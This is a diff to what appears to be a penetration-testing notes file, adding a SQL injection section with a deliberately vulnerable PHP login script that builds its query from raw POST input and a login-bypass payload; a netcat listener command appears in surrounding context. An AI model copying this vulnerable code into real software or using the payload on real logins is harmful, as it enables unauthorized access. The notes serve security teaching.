@@ -429,6 +429,31 @@ nc -nlvp 22
 
 ### SQL Injection
 Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
+#### SQL and php login page
+##### vulnerable code
+````
+<?php
+
+include 'dbconnection.php';
+$userid = $_POST['userid'];
+$password = $_POST['password'];
+$sql =
+"SELECT * FROM users WHERE username = '$userid' AND password = '$password'";
+$result = mysqli_query($db, $sql) or die(mysqli_error($db));
+$num = mysqli_fetch_array($result);
+	
+if($num > 0) {
+	echo "Login Success";
+}
+else {
+	echo "Wrong User id or password";
+}
+?>
+````
+##### php sql login by pass
+````
+admin' -- ' --
+````
 #### Research Repo MariaDB
 <img src="https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png" width="250" height="240" />
 
